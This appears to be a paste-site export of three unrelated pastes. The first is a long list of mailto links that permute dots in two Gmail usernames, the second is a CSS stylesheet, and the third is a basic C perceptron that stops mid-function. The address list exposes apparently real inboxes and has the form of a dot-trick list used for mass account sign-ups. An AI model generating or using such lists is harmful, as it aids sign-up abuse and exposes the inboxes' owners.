<a href=""mailto:ah.me.d.umor.u.2.022a@gmail.com"">ah.me.d.umor.u.2.022a@gmail.com</a>
<a href=""mailto:ah.medu.moru.2.0.2.2.a@gmail.com"">ah.medu.moru.2.0.2.2.a@gmail.com</a>
<a href=""mailto:ah.me.d.umo.r.u.20.22a@gmail.com"">ah.me.d.umo.r.u.20.22a@gmail.com</a>
<a href=""mailto:a.h.me.d.u.mo.r.u20.2.2.a@gmail.com"">a.h.me.d.u.mo.r.u20.2.2.a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.umo.ru2022.a@gmail.com"">a.h.m.e.d.umo.ru2022.a@gmail.com</a>
<a href=""mailto:a.h.me.du.m.or.u2022a@gmail.com"">a.h.me.du.m.or.u2022a@gmail.com</a>
<a href=""mailto:a.h.m.ed.u.mo.r.u2.0.2.2a@gmail.com"">a.h.m.ed.u.mo.r.u2.0.2.2a@gmail.com</a>
<a href=""mailto:ah.m.e.d.u.m.or.u202.2a@gmail.com"">ah.m.e.d.u.m.or.u202.2a@gmail.com</a>
<a href=""mailto:ah.me.du.moru.202.2a@gmail.com"">ah.me.du.moru.202.2a@gmail.com</a>
<a href=""mailto:a.hmed.um.oru2022.a@gmail.com"">a.hmed.um.oru2022.a@gmail.com</a>
<a href=""mailto:ah.m.edu.m.oru.20.2.2a@gmail.com"">ah.m.edu.m.oru.20.2.2a@gmail.com</a>
<a href=""mailto:ah.medum.o.ru.2.02.2.a@gmail.com"">ah.medum.o.ru.2.02.2.a@gmail.com</a>
<a href=""mailto:ah.me.dumo.ru2.02.2a@gmail.com"">ah.me.dumo.ru2.02.2a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.u.m.o.ru.2022.a@gmail.com"">a.h.m.e.d.u.m.o.ru.2022.a@gmail.com</a>
<a href=""mailto:ah.m.e.dum.o.r.u.202.2a@gmail.com"">ah.m.e.dum.o.r.u.202.2a@gmail.com</a>
<a href=""mailto:ahm.edumoru2.02.2.a@gmail.com"">ahm.edumoru2.02.2.a@gmail.com</a>
<a href=""mailto:a.h.medu.m.o.r.u.2.0.2.2a@gmail.com"">a.h.medu.m.o.r.u.2.0.2.2a@gmail.com</a>
<a href=""mailto:a.h.medu.m.or.u.2022a@gmail.com"">a.h.medu.m.or.u.2022a@gmail.com</a>
<a href=""mailto:a.hm.ed.u.mo.r.u.20.22a@gmail.com"">a.hm.ed.u.mo.r.u.20.22a@gmail.com</a>
<a href=""mailto:ah.me.d.u.moru2.0.2.2.a@gmail.com"">ah.me.d.u.moru2.0.2.2.a@gmail.com</a>
<a href=""mailto:a.h.med.umor.u.2.0.22a@gmail.com"">a.h.med.umor.u.2.0.22a@gmail.com</a>
<a href=""mailto:ah.me.dum.or.u.2.022.a@gmail.com"">ah.me.dum.or.u.2.022.a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.moru20.22a@gmail.com"">a.h.m.e.du.moru20.22a@gmail.com</a>
<a href=""mailto:a.h.m.edu.m.oru.20.22a@gmail.com"">a.h.m.edu.m.oru.20.22a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.m.o.r.u20.22a@gmail.com"">a.h.m.e.du.m.o.r.u20.22a@gmail.com</a>
<a href=""mailto:a.hm.e.dumo.r.u202.2a@gmail.com"">a.hm.e.dumo.r.u202.2a@gmail.com</a>
<a href=""mailto:ahm.edumo.ru2.0.2.2.a@gmail.com"">ahm.edumo.ru2.0.2.2.a@gmail.com</a>
<a href=""mailto:ahm.ed.u.mo.r.u.20.22.a@gmail.com"">ahm.ed.u.mo.r.u.20.22.a@gmail.com</a>
<a href=""mailto:ah.m.ed.um.oru.20.22.a@gmail.com"">ah.m.ed.um.oru.20.22.a@gmail.com</a>
<a href=""mailto:a.h.me.d.um.o.ru2.022a@gmail.com"">a.h.me.d.um.o.ru2.022a@gmail.com</a>
<a href=""mailto:ahm.ed.umor.u202.2.a@gmail.com"">ahm.ed.umor.u202.2.a@gmail.com</a>
<a href=""mailto:a.h.m.e.dum.o.r.u202.2.a@gmail.com"">a.h.m.e.dum.o.r.u202.2.a@gmail.com</a>
<a href=""mailto:ah.m.e.d.umor.u.20.2.2.a@gmail.com"">ah.m.e.d.umor.u.20.2.2.a@gmail.com</a>
<a href=""mailto:a.h.medumo.ru2.022.a@gmail.com"">a.h.medumo.ru2.022.a@gmail.com</a>
<a href=""mailto:ahmed.u.moru2.0.22a@gmail.com"">ahmed.u.moru2.0.22a@gmail.com</a>
<a href=""mailto:a.hme.d.umoru.2.0.2.2a@gmail.com"">a.hme.d.umoru.2.0.2.2a@gmail.com</a>
<a href=""mailto:ahme.dumo.ru.2.0.22a@gmail.com"">ahme.dumo.ru.2.0.22a@gmail.com</a>
<a href=""mailto:ahm.edum.oru2.022.a@gmail.com"">ahm.edum.oru2.022.a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.m.o.ru2.022a@gmail.com"">ahm.e.d.u.m.o.ru2.022a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.umo.r.u20.22a@gmail.com"">a.h.m.e.d.umo.r.u20.22a@gmail.com</a>
<a href=""mailto:a.h.m.ed.um.oru.2.02.2.a@gmail.com"">a.h.m.ed.um.oru.2.02.2.a@gmail.com</a>
<a href=""mailto:ah.m.ed.u.moru2.022.a@gmail.com"">ah.m.ed.u.moru2.022.a@gmail.com</a>
<a href=""mailto:ahm.ed.u.m.or.u.202.2a@gmail.com"">ahm.ed.u.m.or.u.202.2a@gmail.com</a>
<a href=""mailto:a.h.m.edu.mo.ru2.022a@gmail.com"">a.h.m.edu.mo.ru2.022a@gmail.com</a>
<a href=""mailto:a.h.m.e.dumoru.2.0.22.a@gmail.com"">a.h.m.e.dumoru.2.0.22.a@gmail.com</a>
<a href=""mailto:a.h.m.ed.um.o.ru20.22.a@gmail.com"">a.h.m.ed.um.o.ru20.22.a@gmail.com</a>
<a href=""mailto:a.hm.e.d.umo.r.u.2.0.2.2.a@gmail.com"">a.hm.e.d.umo.r.u.2.0.2.2.a@gmail.com</a>
<a href=""mailto:ah.m.e.dumoru.2.02.2.a@gmail.com"">ah.m.e.dumoru.2.02.2.a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.moru.202.2.a@gmail.com"">ahm.e.d.u.moru.202.2.a@gmail.com</a>
<a href=""mailto:a.hm.edumoru.2.02.2.a@gmail.com"">a.hm.edumoru.2.02.2.a@gmail.com</a>
<a href=""mailto:a.hm.e.du.mo.ru.202.2a@gmail.com"">a.hm.e.du.mo.ru.202.2a@gmail.com</a>
<a href=""mailto:a.hme.du.m.or.u2.02.2a@gmail.com"">a.hme.du.m.or.u2.02.2a@gmail.com</a>
<a href=""mailto:ah.m.ed.umo.r.u2.022.a@gmail.com"">ah.m.ed.umo.r.u2.022.a@gmail.com</a>
<a href=""mailto:a.h.m.edumoru2022.a@gmail.com"">a.h.m.edumoru2022.a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.moru2022.a@gmail.com"">a.h.m.e.du.moru2022.a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.moru.2.0.22a@gmail.com"">a.h.m.e.du.moru.2.0.22a@gmail.com</a>
<a href=""mailto:a.hm.edu.mo.r.u2022.a@gmail.com"">a.hm.edu.mo.r.u2022.a@gmail.com</a>
<a href=""mailto:a.h.m.edu.m.o.r.u2.02.2.a@gmail.com"">a.h.m.edu.m.o.r.u2.02.2.a@gmail.com</a>
<a href=""mailto:a.h.me.d.u.m.or.u.20.2.2.a@gmail.com"">a.h.me.d.u.m.or.u.20.2.2.a@gmail.com</a>
<a href=""mailto:ah.m.ed.u.m.o.ru2.0.22.a@gmail.com"">ah.m.ed.u.m.o.ru2.0.22.a@gmail.com</a>
<a href=""mailto:a.hme.du.mo.ru.2.0.2.2.a@gmail.com"">a.hme.du.mo.ru.2.0.2.2.a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.m.o.ru.20.2.2a@gmail.com"">a.h.m.e.du.m.o.ru.20.2.2a@gmail.com</a>
<a href=""mailto:a.h.me.du.moru.2.0.22.a@gmail.com"">a.h.me.du.moru.2.0.22.a@gmail.com</a>
<a href=""mailto:a.hme.d.umo.ru.202.2.a@gmail.com"">a.hme.d.umo.ru.202.2.a@gmail.com</a>
<a href=""mailto:a.hme.du.m.or.u.2.022.a@gmail.com"">a.hme.du.m.or.u.2.022.a@gmail.com</a>
<a href=""mailto:a.hme.d.um.o.r.u202.2.a@gmail.com"">a.hme.d.um.o.r.u202.2.a@gmail.com</a>
<a href=""mailto:a.hmed.umo.r.u.20.2.2a@gmail.com"">a.hmed.umo.r.u.20.2.2a@gmail.com</a>
<a href=""mailto:a.h.m.edu.mo.ru20.22.a@gmail.com"">a.h.m.edu.mo.ru20.22.a@gmail.com</a>
<a href=""mailto:ah.m.edumo.ru2.022.a@gmail.com"">ah.m.edumo.ru2.022.a@gmail.com</a>
<a href=""mailto:ahme.d.umo.ru.2022a@gmail.com"">ahme.d.umo.ru.2022a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.um.o.ru2.0.2.2.a@gmail.com"">a.h.m.e.d.um.o.ru2.0.2.2.a@gmail.com</a>
<a href=""mailto:ah.me.du.m.o.r.u202.2.a@gmail.com"">ah.me.du.m.o.r.u202.2.a@gmail.com</a>
<a href=""mailto:ah.med.u.m.o.r.u20.2.2.a@gmail.com"">ah.med.u.m.o.r.u20.2.2.a@gmail.com</a>
<a href=""mailto:a.hme.du.mo.r.u2.0.2.2.a@gmail.com"">a.hme.du.mo.r.u2.0.2.2.a@gmail.com</a>
<a href=""mailto:ah.m.e.d.um.or.u2.02.2a@gmail.com"">ah.m.e.d.um.or.u2.02.2a@gmail.com</a>
<a href=""mailto:ah.m.e.dumoru.2.022a@gmail.com"">ah.m.e.dumoru.2.022a@gmail.com</a>
<a href=""mailto:ah.m.e.du.m.or.u2.022.a@gmail.com"">ah.m.e.du.m.or.u2.022.a@gmail.com</a>
<a href=""mailto:ah.medum.or.u20.2.2.a@gmail.com"">ah.medum.or.u20.2.2.a@gmail.com</a>
<a href=""mailto:ah.me.d.u.m.o.r.u2.0.2.2a@gmail.com"">ah.me.d.u.m.o.r.u2.0.2.2a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.mo.r.u2.0.22a@gmail.com"">ahm.e.d.u.mo.r.u2.0.22a@gmail.com</a>
<a href=""mailto:ah.med.umor.u.2.02.2a@gmail.com"">ah.med.umor.u.2.02.2a@gmail.com</a>
<a href=""mailto:ah.m.edum.oru20.22a@gmail.com"">ah.m.edum.oru20.22a@gmail.com</a>
<a href=""mailto:ah.me.d.umo.r.u2.022a@gmail.com"">ah.me.d.umo.r.u2.022a@gmail.com</a>
<a href=""mailto:ahme.dumor.u.2.0.22.a@gmail.com"">ahme.dumor.u.2.0.22.a@gmail.com</a>
<a href=""mailto:ah.me.d.u.m.or.u2.0.22a@gmail.com"">ah.me.d.u.m.or.u2.0.22a@gmail.com</a>
<a href=""mailto:ah.m.e.du.mo.ru.2.022a@gmail.com"">ah.m.e.du.mo.ru.2.022a@gmail.com</a>
<a href=""mailto:ah.m.edu.moru.2.022a@gmail.com"">ah.m.edu.moru.2.022a@gmail.com</a>
<a href=""mailto:ah.med.u.mor.u.2.02.2a@gmail.com"">ah.med.u.mor.u.2.02.2a@gmail.com</a>
<a href=""mailto:a.hm.e.dumoru.2.022a@gmail.com"">a.hm.e.dumoru.2.022a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.m.o.r.u.2.022.a@gmail.com"">ahm.e.d.u.m.o.r.u.2.022.a@gmail.com</a>
<a href=""mailto:ah.m.ed.umo.ru.2.0.22a@gmail.com"">ah.m.ed.umo.ru.2.0.22a@gmail.com</a>
<a href=""mailto:ahmedu.moru20.22a@gmail.com"">ahmedu.moru20.22a@gmail.com</a>
<a href=""mailto:ahm.ed.um.or.u2.02.2a@gmail.com"">ahm.ed.um.or.u2.02.2a@gmail.com</a>
<a href=""mailto:a.hm.e.d.umo.ru.2022.a@gmail.com"">a.hm.e.d.umo.ru.2022.a@gmail.com</a>
<a href=""mailto:a.hm.ed.u.mo.r.u.2.02.2a@gmail.com"">a.hm.ed.u.mo.r.u.2.02.2a@gmail.com</a>
<a href=""mailto:a.hm.e.d.u.m.oru2.022.a@gmail.com"">a.hm.e.d.u.m.oru2.022.a@gmail.com</a>
<a href=""mailto:a.hm.e.dumo.ru202.2.a@gmail.com"">a.hm.e.dumo.ru202.2.a@gmail.com</a>
<a href=""mailto:ahme.du.m.or.u20.22.a@gmail.com"">ahme.du.m.or.u20.22.a@gmail.com</a>
<a href=""mailto:ah.medum.o.ru2.02.2a@gmail.com"">ah.medum.o.ru2.02.2a@gmail.com</a>
<a href=""mailto:ahmed.u.m.o.r.u.2022a@gmail.com"">ahmed.u.m.o.r.u.2022a@gmail.com</a>
<a href=""mailto:ahme.d.umoru.2.022.a@gmail.com"">ahme.d.umoru.2.022.a@gmail.com</a>
<a href=""mailto:ah.m.edumo.ru2.0.2.2.a@gmail.com"">ah.m.edumo.ru2.0.2.2.a@gmail.com</a>
<a href=""mailto:a.hmed.um.o.r.u2.02.2.a@gmail.com"">a.hmed.um.o.r.u2.02.2.a@gmail.com</a>
<a href=""mailto:ahmed.u.mo.r.u2.0.2.2a@gmail.com"">ahmed.u.mo.r.u2.0.2.2a@gmail.com</a>
<a href=""mailto:a.hm.ed.umo.ru2.02.2a@gmail.com"">a.hm.ed.umo.ru2.02.2a@gmail.com</a>
<a href=""mailto:a.hmed.u.mo.r.u.2022a@gmail.com"">a.hmed.u.mo.r.u.2022a@gmail.com</a>
<a href=""mailto:a.hmed.um.o.ru2.02.2a@gmail.com"">a.hmed.um.o.ru2.02.2a@gmail.com</a>
<a href=""mailto:a.hmedum.o.ru.2.0.2.2.a@gmail.com"">a.hmedum.o.ru.2.0.2.2.a@gmail.com</a>
<a href=""mailto:ahmed.u.m.o.ru2022.a@gmail.com"">ahmed.u.m.o.ru2022.a@gmail.com</a>
<a href=""mailto:a.h.medumoru.2.022.a@gmail.com"">a.h.medumoru.2.022.a@gmail.com</a>
<a href=""mailto:ah.me.du.m.oru.2.022a@gmail.com"">ah.me.du.m.oru.2.022a@gmail.com</a>
<a href=""mailto:ahm.ed.umor.u.2.022.a@gmail.com"">ahm.ed.umor.u.2.022.a@gmail.com</a>
<a href=""mailto:ah.m.ed.u.m.oru202.2.a@gmail.com"">ah.m.ed.u.m.oru202.2.a@gmail.com</a>
<a href=""mailto:a.hme.dumor.u.20.22a@gmail.com"">a.hme.dumor.u.20.22a@gmail.com</a>
<a href=""mailto:a.hm.ed.um.or.u20.2.2a@gmail.com"">a.hm.ed.um.or.u20.2.2a@gmail.com</a>
<a href=""mailto:a.h.med.u.m.o.ru.2.0.2.2.a@gmail.com"">a.h.med.u.m.o.ru.2.0.2.2.a@gmail.com</a>
<a href=""mailto:a.h.med.umo.r.u2.02.2a@gmail.com"">a.h.med.umo.r.u2.02.2a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.umo.r.u2.0.2.2a@gmail.com"">a.h.m.e.d.umo.r.u2.0.2.2a@gmail.com</a>
<a href=""mailto:a.h.me.d.um.o.r.u.2.0.22.a@gmail.com"">a.h.me.d.um.o.r.u.2.0.22.a@gmail.com</a>
<a href=""mailto:ah.m.ed.umor.u20.22.a@gmail.com"">ah.m.ed.umor.u20.22.a@gmail.com</a>
<a href=""mailto:ah.m.e.d.u.m.o.ru.2.0.22a@gmail.com"">ah.m.e.d.u.m.o.ru.2.0.22a@gmail.com</a>
<a href=""mailto:a.h.med.um.oru202.2a@gmail.com"">a.h.med.um.oru202.2a@gmail.com</a>
<a href=""mailto:ahmedu.mo.r.u2022a@gmail.com"">ahmedu.mo.r.u2022a@gmail.com</a>
<a href=""mailto:ah.me.d.um.or.u20.2.2a@gmail.com"">ah.me.d.um.or.u20.2.2a@gmail.com</a>
<a href=""mailto:a.hm.e.dum.or.u.2022a@gmail.com"">a.hm.e.dum.or.u.2022a@gmail.com</a>
<a href=""mailto:ah.med.u.mo.r.u.2.02.2a@gmail.com"">ah.med.u.mo.r.u.2.02.2a@gmail.com</a>
<a href=""mailto:a.h.medu.m.or.u.20.2.2.a@gmail.com"">a.h.medu.m.or.u.20.2.2.a@gmail.com</a>
<a href=""mailto:a.hmed.um.o.ru20.2.2a@gmail.com"">a.hmed.um.o.ru20.2.2a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.m.oru20.22a@gmail.com"">ahm.e.d.u.m.oru20.22a@gmail.com</a>
<a href=""mailto:ah.m.e.du.m.oru.2.0.22a@gmail.com"">ah.m.e.du.m.oru.2.0.22a@gmail.com</a>
<a href=""mailto:ah.me.d.u.m.or.u.20.22.a@gmail.com"">ah.me.d.u.m.or.u.20.22.a@gmail.com</a>
<a href=""mailto:ahm.e.d.u.mo.ru.20.2.2.a@gmail.com"">ahm.e.d.u.mo.ru.20.2.2.a@gmail.com</a>
<a href=""mailto:a.hm.edumo.ru.2.022a@gmail.com"">a.hm.edumo.ru.2.022a@gmail.com</a>
<a href=""mailto:a.hme.d.u.m.or.u2.0.22.a@gmail.com"">a.hme.d.u.m.or.u2.0.22.a@gmail.com</a>
<a href=""mailto:ah.medu.mo.r.u.20.22.a@gmail.com"">ah.medu.mo.r.u.20.22.a@gmail.com</a>
<a href=""mailto:ah.m.e.du.m.or.u.20.2.2.a@gmail.com"">ah.m.e.du.m.or.u.20.2.2.a@gmail.com</a>
<a href=""mailto:a.h.m.ed.u.moru20.22a@gmail.com"">a.h.m.ed.u.moru20.22a@gmail.com</a>
<a href=""mailto:a.h.med.u.mo.ru20.2.2a@gmail.com"">a.h.med.u.mo.ru20.2.2a@gmail.com</a>
<a href=""mailto:a.hmed.u.m.o.ru2022a@gmail.com"">a.hmed.u.m.o.ru2022a@gmail.com</a>
<a href=""mailto:ahm.e.d.umo.r.u.2.0.22.a@gmail.com"">ahm.e.d.umo.r.u.2.0.22.a@gmail.com</a>
<a href=""mailto:a.hme.dumor.u.2022.a@gmail.com"">a.hme.dumor.u.2022.a@gmail.com</a>
<a href=""mailto:ahm.edum.o.r.u.2.022a@gmail.com"">ahm.edum.o.r.u.2.022a@gmail.com</a>
<a href=""mailto:ahm.e.du.m.o.r.u202.2.a@gmail.com"">ahm.e.du.m.o.r.u202.2.a@gmail.com</a>
<a href=""mailto:ahmedumor.u.2.0.2.2a@gmail.com"">ahmedumor.u.2.0.2.2a@gmail.com</a>
<a href=""mailto:a.h.m.e.d.u.m.o.r.u.202.2.a@gmail.com"">a.h.m.e.d.u.m.o.r.u.202.2.a@gmail.com</a>
<a href=""mailto:ah.me.du.m.oru.202.2a@gmail.com"">ah.me.du.m.oru.202.2a@gmail.com</a>
<a href=""mailto:ahme.d.u.m.o.ru.20.2.2a@gmail.com"">ahme.d.u.m.o.ru.20.2.2a@gmail.com</a>
<a href=""mailto:a.h.m.e.dumo.ru2.0.2.2a@gmail.com"">a.h.m.e.dumo.ru2.0.2.2a@gmail.com</a>
<a href=""mailto:ah.me.dumor.u2.02.2a@gmail.com"">ah.me.dumor.u2.02.2a@gmail.com</a>
<a href=""mailto:ahme.dumoru.20.2.2.a@gmail.com"">ahme.dumoru.20.2.2.a@gmail.com</a>
<a href=""mailto:a.hmedu.mor.u20.22a@gmail.com"">a.hmedu.mor.u20.22a@gmail.com</a>
<a href=""mailto:a.hme.d.um.or.u.2022a@gmail.com"">a.hme.d.um.or.u.2022a@gmail.com</a>
<a href=""mailto:a.h.me.du.m.or.u.2.022a@gmail.com"">a.h.me.du.m.or.u.2.022a@gmail.com</a>
<a href=""mailto:ahmedu.m.o.r.u.2022a@gmail.com"">ahmedu.m.o.r.u.2022a@gmail.com</a>
<a href=""mailto:a.hm.e.d.u.mo.r.u202.2a@gmail.com"">a.hm.e.d.u.mo.r.u202.2a@gmail.com</a>
<a href=""mailto:a.h.medu.mo.ru20.2.2a@gmail.com"">a.h.medu.mo.ru20.2.2a@gmail.com</a>
<a href=""mailto:ah.medu.mo.r.u2022.a@gmail.com"">ah.medu.mo.r.u2022.a@gmail.com</a>
<a href=""mailto:ah.medumoru.2.0.22a@gmail.com"">ah.medumoru.2.0.22a@gmail.com</a>
<a href=""mailto:a.hme.d.u.m.or.u.20.22.a@gmail.com"">a.hme.d.u.m.or.u.20.22.a@gmail.com</a>
<a href=""mailto:a.h.medum.oru2.0.2.2.a@gmail.com"">a.h.medum.oru2.0.2.2.a@gmail.com</a>
<a href=""mailto:ah.me.du.mo.r.u2.0.2.2.a@gmail.com"">ah.me.du.mo.r.u2.0.2.2.a@gmail.com</a>
<a href=""mailto:ahmedumoru2.022a@gmail.com"">ahmedumoru2.022a@gmail.com</a>
<a href=""mailto:ahme.d.u.mor.u.202.2.a@gmail.com"">ahme.d.u.mor.u.202.2.a@gmail.com</a>
<a href=""mailto:ahm.e.d.umo.r.u2.0.2.2.a@gmail.com"">ahm.e.d.umo.r.u2.0.2.2.a@gmail.com</a>
<a href=""mailto:a.hm.e.du.mor.u20.22.a@gmail.com"">a.hm.e.du.mor.u20.22.a@gmail.com</a>
<a href=""mailto:a.h.m.e.du.m.o.r.u202.2a@gmail.com"">a.h.m.e.du.m.o.r.u202.2a@gmail.com</a>
<a href=""mailto:ahme.d.um.o.ru.2.0.22a@gmail.com"">ahme.d.um.o.ru.2.0.22a@gmail.com</a>
<a href=""mailto:otehboy@gmail.com"">otehboy@gmail.com</a>
<a href=""mailto:ot.ehb.o.y@gmail.com"">ot.ehb.o.y@gmail.com</a>
<a href=""mailto:o.t.e.h.bo.y@gmail.com"">o.t.e.h.bo.y@gmail.com</a>
<a href=""mailto:ote.h.b.oy@gmail.com"">ote.h.b.oy@gmail.com</a>
<a href=""mailto:o.te.h.boy@gmail.com"">o.te.h.boy@gmail.com</a>
<a href=""mailto:o.t.eh.b.oy@gmail.com"">o.t.eh.b.oy@gmail.com</a>
<a href=""mailto:o.t.eh.b.o.y@gmail.com"">o.t.eh.b.o.y@gmail.com</a>
<a href=""mailto:ot.e.h.b.o.y@gmail.com"">ot.e.h.b.o.y@gmail.com</a>
<a href=""mailto:ote.hboy@gmail.com"">ote.hboy@gmail.com</a>
<a href=""mailto:o.t.e.hboy@gmail.com"">o.t.e.hboy@gmail.com</a>
<a href=""mailto:ote.h.bo.y@gmail.com"">ote.h.bo.y@gmail.com</a>
<a href=""mailto:ot.ehbo.y@gmail.com"">ot.ehbo.y@gmail.com</a>
<a href=""mailto:o.t.e.h.boy@gmail.com"">o.t.e.h.boy@gmail.com</a>
<a href=""mailto:o.t.eh.boy@gmail.com"">o.t.eh.boy@gmail.com</a>
<a href=""mailto:otehboy@gmail.com"">otehboy@gmail.com</a>
<a href=""mailto:o.t.ehboy@gmail.com"">o.t.ehboy@gmail.com</a>
<a href=""mailto:oteh.boy@gmail.com"">oteh.boy@gmail.com</a>
<a href=""mailto:o.t.ehbo.y@gmail.com"">o.t.ehbo.y@gmail.com</a>
<a href=""mailto:ote.hbo.y@gmail.com"">ote.hbo.y@gmail.com</a>
<a href=""mailto:o.t.ehb.o.y@gmail.com"">o.t.ehb.o.y@gmail.com</a>
<a href=""mailto:o.t.e.h.b.o.y@gmail.com"">o.t.e.h.b.o.y@gmail.com</a>
<a href=""mailto:ot.eh.b.oy@gmail.com"">ot.eh.b.oy@gmail.com</a>
<a href=""mailto:ot.e.hboy@gmail.com"">ot.e.hboy@gmail.com</a>
<a href=""mailto:ot.eh.b.o.y@gmail.com"">ot.eh.b.o.y@gmail.com</a>
<a href=""mailto:o.t.e.hbo.y@gmail.com"">o.t.e.hbo.y@gmail.com</a>
<a href=""mailto:ot.e.hbo.y@gmail.com"">ot.e.hbo.y@gmail.com</a>
<a href=""mailto:o.teh.b.oy@gmail.com"">o.teh.b.oy@gmail.com</a>
<a href=""mailto:ot.e.h.boy@gmail.com"">ot.e.h.boy@gmail.com</a>
<a href=""mailto:o.tehb.oy@gmail.com"">o.tehb.oy@gmail.com</a>
<a href=""mailto:otehbo.y@gmail.com"">otehbo.y@gmail.com</a>
<a href=""mailto:o.t.eh.bo.y@gmail.com"">o.t.eh.bo.y@gmail.com</a>
<a href=""mailto:oteh.b.oy@gmail.com"">oteh.b.oy@gmail.com</a>
<a href=""mailto:o.te.hbo.y@gmail.com"">o.te.hbo.y@gmail.com</a>
<a href=""mailto:o.te.h.b.oy@gmail.com"">o.te.h.b.oy@gmail.com</a>
<a href=""mailto:ot.e.h.b.oy@gmail.com"">ot.e.h.b.oy@gmail.com</a>
<a href=""mailto:ot.eh.boy@gmail.com"">ot.eh.boy@gmail.com</a>
<a href=""mailto:o.t.e.hb.o.y@gmail.com"">o.t.e.hb.o.y@gmail.com</a>
<a href=""mailto:o.te.h.bo.y@gmail.com"">o.te.h.bo.y@gmail.com</a>
<a href=""mailto:o.te.hboy@gmail.com"">o.te.hboy@gmail.com</a>
<a href=""mailto:ot.e.hb.oy@gmail.com"">ot.e.hb.oy@gmail.com</a>
<a href=""mailto:o.tehboy@gmail.com"">o.tehboy@gmail.com</a>
<a href=""mailto:o.teh.b.o.y@gmail.com"">o.teh.b.o.y@gmail.com</a>
<a href=""mailto:o.t.e.hb.oy@gmail.com"">o.t.e.hb.oy@gmail.com</a>
<a href=""mailto:ot.e.hb.o.y@gmail.com"">ot.e.hb.o.y@gmail.com</a>
<a href=""mailto:ot.ehboy@gmail.com"">ot.ehboy@gmail.com</a>
<a href=""mailto:o.teh.boy@gmail.com"">o.teh.boy@gmail.com</a>
<a href=""mailto:ote.hb.oy@gmail.com"">ote.hb.oy@gmail.com</a>
<a href=""mailto:ote.hb.o.y@gmail.com"">ote.hb.o.y@gmail.com</a>
<a href=""mailto:ot.eh.bo.y@gmail.com"">ot.eh.bo.y@gmail.com</a>
<a href=""mailto:o.te.hb.oy@gmail.com"">o.te.hb.oy@gmail.com</a>
<a href=""mailto:oteh.b.o.y@gmail.com"">oteh.b.o.y@gmail.com</a>
<a href=""mailto:oteh.bo.y@gmail.com"">oteh.bo.y@gmail.com</a>
<a href=""mailto:o.tehbo.y@gmail.com"">o.tehbo.y@gmail.com</a>
<a href=""mailto:o.tehb.o.y@gmail.com"">o.tehb.o.y@gmail.com</a>
<a href=""mailto:otehb.oy@gmail.com"">otehb.oy@gmail.com</a>
<a href=""mailto:o.te.hb.o.y@gmail.com"">o.te.hb.o.y@gmail.com</a>
<a href=""mailto:ote.h.boy@gmail.com"">ote.h.boy@gmail.com</a>
<a href=""mailto:ot.ehb.oy@gmail.com"">ot.ehb.oy@gmail.com</a>
<a href=""mailto:o.te.h.b.o.y@gmail.com"">o.te.h.b.o.y@gmail.com</a>
<a href=""mailto:ote.h.b.o.y@gmail.com"">ote.h.b.o.y@gmail.com</a>
<a href=""mailto:o.t.ehb.oy@gmail.com"">o.t.ehb.oy@gmail.com</a>
<a href=""mailto:otehb.o.y@gmail.com"">otehb.o.y@gmail.com</a>
<a href=""mailto:o.t.e.h.b.oy@gmail.com"">o.t.e.h.b.oy@gmail.com</a>
<a href=""mailto:o.teh.bo.y@gmail.com"">o.teh.bo.y@gmail.com</a>
<a href=""mailto:ot.e.h.bo.y@gmail.com"">ot.e.h.bo.y@gmail.com</a>"
RcY49sYx,cyber alliance css draft 19,Anonx0,CSS,Thursday 28th of December 2023 02:24:23 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {
  border: .2rem solid var(--crimson);
}

summary {
  background: var(--blood);
  color: var(--light);
  cursor: pointer;
  list-style: none;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
iCSgkfha,Basic perceptron,Miquel_Fuster,C,Thursday 28th of December 2023 02:15:12 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// the perceptron
typedef struct {
    size_t inputs_count;
    double learning_rate;
    double bias;
    double *weight;
    double (*activation)(double aggregation);
} perceptron;

// a basic activation function
double step_function(double value) {
    return value < 0.5? 0 : 1;
}

// initialization of a perceptron
void perceptron_init(perceptron *p, size_t inputs_count, double learning_rate, double (*activation_function)(double)) {
    srand(time(NULL));

    p->bias = (double)rand() / (double)RAND_MAX; // between 0 and 1
    p->weight = malloc(sizeof(double) * inputs_count);
    p->inputs_count = inputs_count;
    p->learning_rate = learning_rate;
    p->activation = activation_function;

    // basic error handling
    if(p->weight == NULL) {
        p->inputs_count = 0;
        return;
    }

    for(size_t i = 0; i < inputs_count; ++i) {
        p->weight[i] = (double)rand() / (double)RAND_MAX;
    }
}

// activation_function(bias + input[0] * weight[0] + input[1] * weight[1] + ...)
double perceptron_predict(perceptron *p, double inputs[]) {
    double aggregation = p->bias;
    for(size_t i = 0; i < p->inputs_count; ++i) {
        aggregation += inputs[i] * p->weight[i];
    }
